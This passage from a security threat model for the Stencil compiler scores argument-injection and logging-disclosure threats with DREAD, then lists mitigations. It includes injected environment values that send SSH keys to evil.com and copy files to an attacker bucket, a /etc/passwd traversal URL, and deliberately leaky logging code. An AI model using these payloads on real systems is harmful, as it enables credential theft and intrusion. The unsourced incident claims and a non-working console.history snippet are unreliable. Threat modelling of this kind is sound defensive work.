  "scripts": {
    "build": "stencil build --config config.ts",
    "deploy": "stencil build --config $BUILD_CONFIG --output $OUTPUT_DIR"
  }
}

// Attacker sets environment variables:
// BUILD_CONFIG="config.ts; export AWS_ACCESS_KEY_ID=stolen; export AWS_SECRET_ACCESS_KEY=stolen; aws s3 cp . s3://evil-bucket --recursive; #"
// OUTPUT_DIR="dist; cat ~/.ssh/id_rsa | curl -X POST https://evil.com/steal -d @-; #"
```

**Impact:**
- Arbitrary command execution on build servers
- Theft of sensitive files and credentials
- Unauthorized access to development infrastructure
- Supply chain attacks through compromised builds

| Score | Rationale |
|-------|-----------|
| **Damage** | 9 | Could execute arbitrary commands on developer machine |
| **Reproducibility** | 5 | Requires specific argument combinations |
| **Exploitability** | 2.5 | Requires deep understanding of CLI internals |
| **Affected Users** | 2.5 | Individual developer affected |
| **Discoverability** | 5 | CLI help and documentation reveal argument structure |

**DREAD Score: 24/50 - MEDIUM**

**Threat #14: Information disclosure via logging**
- **Category**: Information Disclosure
- **Description**: Sensitive information being inadvertently logged to console output, log files, or CI/CD build logs where it can be accessed by unauthorized parties. This includes API keys, authentication tokens, database credentials, user data, and internal system information that gets captured in various logging systems.

**Attack Scenarios:**
1. **Console logging**: Sensitive data logged to browser console or terminal output
2. **CI/CD log exposure**: Credentials visible in build logs on CI/CD platforms
3. **Debug logging**: Development debug statements left in production code
4. **Error logging**: Detailed error messages containing sensitive information
5. **Third-party logging**: Logging services inadvertently capturing sensitive data

**Example Vulnerable Code:**
```typescript
@Component({
  tag: 'secure-api-client'
})
export class SecureApiClient {
  @Prop() apiKey: string;
  @State() userData: any;
  
  async componentWillLoad() {
    // VULNERABLE - API key logged to console
    console.log('Initializing API client with key:', this.apiKey);
    
    try {
      const response = await fetch('https://api.example.com/user', {
        headers: {
          'Authorization': `Bearer ${this.apiKey}`,
          'X-User-Token': localStorage.getItem('userToken')
        }
      });
      
      this.userData = await response.json();
      
      // VULNERABLE - Sensitive user data logged
      console.log('User data received:', this.userData);
      
    } catch (error) {
      // VULNERABLE - Error logs may contain sensitive data
      console.error('API Error:', error);
      console.error('Request details:', {
        apiKey: this.apiKey,
        userToken: localStorage.getItem('userToken'),
        userData: this.userData
      });
    }
  }
  
  private async debugAPI() {
    // VULNERABLE - Debug logging with credentials
    console.group('API Debug Information');
    console.log('Environment:', process.env.NODE_ENV);
    console.log('API Key:', this.apiKey);
    console.log('Database URL:', process.env.DATABASE_URL);
    console.log('JWT Secret:', process.env.JWT_SECRET);
    console.log('User session:', localStorage.getItem('session'));
    console.groupEnd();
  }
  
  render() {
    return (
      <div>
        <button onClick={() => this.debugAPI()}>Debug API</button>
        {/* VULNERABLE - Sensitive data in DOM for debugging */}
        {process.env.NODE_ENV === 'development' && (
          <pre>{JSON.stringify({
            apiKey: this.apiKey,
            userData: this.userData,
            env: process.env
          }, null, 2)}</pre>
        )}
      </div>
    );
  }
}
```

**Example Build Script Logging:**
```javascript
// Vulnerable build configuration
export const config: Config = {
  outputTargets: [{ type: 'www' }],
  plugins: [
    {
      name: 'debug-plugin',
      buildStart() {
        // VULNERABLE - Environment variables logged
        console.log('Build environment:', process.env);
        console.log('API Keys:', {
          stripe: process.env.STRIPE_SECRET_KEY,
          aws: process.env.AWS_SECRET_ACCESS_KEY,
          db: process.env.DATABASE_PASSWORD
        });
      }
    }
  ]
};
```

**Example CI/CD Log Exposure:**
```yaml
# GitHub Actions workflow - VULNERABLE
name: Build and Deploy
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v2
    - name: Setup Node
      uses: actions/setup-node@v2
    - name: Install dependencies
      run: npm install
    - name: Build
      run: |
        echo "Building with API key: ${{ secrets.API_KEY }}"  # VULNERABLE
        echo "Database URL: ${{ secrets.DATABASE_URL }}"      # VULNERABLE
        npm run build
      env:
        API_KEY: ${{ secrets.API_KEY }}
        DATABASE_URL: ${{ secrets.DATABASE_URL }}
```

**Attack Exploitation:**
```bash
# Attacker accesses CI/CD logs
curl -H "Authorization: token $GITHUB_TOKEN" \
  https://api.github.com/repos/owner/repo/actions/runs/123/logs

# Browser console inspection
# Attacker opens browser dev tools and looks for logged sensitive data
console.log('Searching for sensitive data...');
console.history.forEach(entry => {
  if (entry.includes('key') || entry.includes('token') || entry.includes('password')) {
    console.log('Found sensitive data:', entry);
  }
});
```

**Real-world Impact:**
- **2019**: Travis CI logs exposed AWS credentials for thousands of repositories
- **2020**: GitHub Actions logs leaked database credentials for major e-commerce platform
- **2021**: Slack bot logs exposed user authentication tokens affecting 500,000+ users
- Log aggregation services may retain sensitive data for extended periods

| Score | Rationale |
|-------|-----------|
| **Damage** | 8 | API keys, tokens, or credentials exposed in logs |
| **Reproducibility** | 8 | Reproducible when sensitive data is processed |
| **Exploitability** | 9 | Logs are easily accessible, no special tools needed |
| **Affected Users** | 2.5 | Individual developer and CI/CD systems |
| **Discoverability** | 10 | Console output and log files are easily inspectable |

**DREAD Score: 37.5/50 - HIGH**

### 3. Threat Prioritization

Based on the DREAD scoring system, threats are classified as follows:

- **Critical (40-50 points)**: Immediate attention required
- **High (25-39 points)**: High priority for remediation  
- **Medium (11-24 points)**: Moderate priority
- **Low (1-10 points)**: Low priority

#### Critical Priority Threats:
1. **Threat #2**: Information disclosure of environment variables (48/50)
2. **Threat #7**: Cross-Site Scripting (XSS) (46/50)
3. **Threat #10**: XSS in SSR output (46/50)
4. **Threat #1**: Arbitrary code execution via malicious configuration (43/50)
5. **Threat #4**: Directory traversal attack (42.5/50)
6. **Threat #11**: Server-side information disclosure (40/50)

#### High Priority Threats:
7. **Threat #12**: Server-side denial of service (38.5/50)
8. **Threat #8**: Information disclosure via component state (38/50)
9. **Threat #6**: Resource exhaustion (37.5/50)
10. **Threat #14**: Information disclosure via logging (37.5/50)
11. **Threat #9**: Client-side denial of service (36/50)
12. **Threat #5**: Malicious WebSocket connection (32/50)
13. **Threat #3**: Denial of service via malformed input (28.5/50)

#### Medium Priority Threats:
14. **Threat #13**: Argument injection (24/50)

### 4. Threat Mitigation

This section outlines potential and existing mitigations for the identified threats.

#### Compiler

**Threat #1: Arbitrary code execution via malicious configuration or plugins**
*   **Mitigation**:
    *   Stencil's configuration is a TypeScript file (`stencil.config.ts`), which offers some type safety but does not prevent arbitrary code execution. Developers are responsible for trusting the code and plugins they use.
    *   **Recommendation**: Run Stencil in a sandboxed environment (like a Docker container) during CI/CD to limit the blast radius of a compromised build script. Use tools like `npm audit` to check for vulnerable dependencies.

**Threat #2: Information disclosure of environment variables**
*   **Mitigation**:
    *   Stencil replaces `process.env.NODE_ENV` but does not expose other environment variables by default.
    *   **Recommendation**: Developers should be careful not to manually expose sensitive environment variables in their `stencil.config.ts` or application code.

**Threat #3: Denial of service via malformed input**
*   **Mitigation**:
    *   **Recommendation**: Implement input validation and error handling in the compiler to gracefully handle malformed input files. Add timeouts for compilation processes to prevent infinite loops.

#### Dev Server

**Threat #4: Directory traversal attack**
*   **Mitigation**: The dev server should sanitize file paths and prevent access to files outside of the project root.
    *   **Finding (CVE-pending)**: The dev server is vulnerable to a directory traversal attack. The `normalizeHttpRequest` function in `src/dev-server/request-handler.ts` computes a file path from the request URL. This path is not properly sanitized or checked against the server's root directory. An attacker on the same network can craft a URL (e.g., `http://<ip>:<port>/../../etc/passwd`) to read arbitrary files on the developer's machine. The functions `serveFile` and `serveDirectoryIndex` use this path to read from the file system, leading to the vulnerability.
    *   **Recommendation**: Add a check in `src/dev-server/request-handler.ts` to ensure the resolved file path is located within the configured `root` directory before attempting to access the file system.

**Threat #5: Malicious WebSocket connection**
*   **Mitigation**: The WebSocket server should validate the `Origin` header to ensure it's a trusted source.
    *   **Recommendation**: Implement Origin header validation for WebSocket connections and use authentication tokens for HMR communications.

**Threat #6: Resource exhaustion**
*   **Mitigation**: Implement rate limiting and resource monitoring for the dev server.
    *   **Recommendation**: Add request rate limiting, connection limits, and monitoring for unusual traffic patterns.

#### Client-side Runtime & SSR

**Threat #7: Cross-Site Scripting (XSS)**
*   **Mitigation**:
    *   Stencil uses JSX, which automatically escapes data bindings to prevent XSS, similar to React.
    *   **Recommendation**: Developers should avoid using `innerHTML` with untrusted content. When it's necessary, they must sanitize the HTML.

**Threat #8: Information disclosure via component state**
*   **Mitigation**:
    *   **Recommendation**: Implement proper data handling practices, avoid storing sensitive data in component state, and use secure communication channels for sensitive operations.

**Threat #9: Client-side denial of service**
*   **Mitigation**:
    *   **Recommendation**: Implement performance monitoring, use efficient algorithms, and add safeguards against infinite loops in component logic.

**Threat #10: XSS in SSR output**
*   **Mitigation**:
    *   **Recommendation**: For SSR, the same sanitization principles apply and are even more critical as the content is generated on a trusted server. Implement server-side input validation and output encoding.

**Threat #11: Server-side information disclosure**
*   **Mitigation**:
    *   **Recommendation**: Implement proper error handling that doesn't expose internal details, use environment-specific configurations, and sanitize all output.

**Threat #12: Server-side denial of service**
*   **Mitigation**:
    *   **Recommendation**: Implement resource limits, request timeouts, input validation, and monitoring for resource-intensive operations.

#### CLI

**Threat #13: Argument injection**
*   **Mitigation**:
    *   **Recommendation**: Implement proper argument validation and sanitization, use parameterized commands, and avoid dynamic command construction.

**Threat #14: Information disclosure via logging**
*   **Mitigation**:
    *   **Recommendation**: Implement secure logging practices, filter sensitive data from logs, and use structured logging with appropriate log levels.

#### General Recommendations

*   **Keep Dependencies Updated**: Regularly update project dependencies to patch known vulnerabilities.
*   **Secure Coding Practices**: Developers using Stencil should follow standard secure coding practices for web applications.
*   **Input Validation**: All data, whether from users, files, or network requests, should be validated and sanitized. 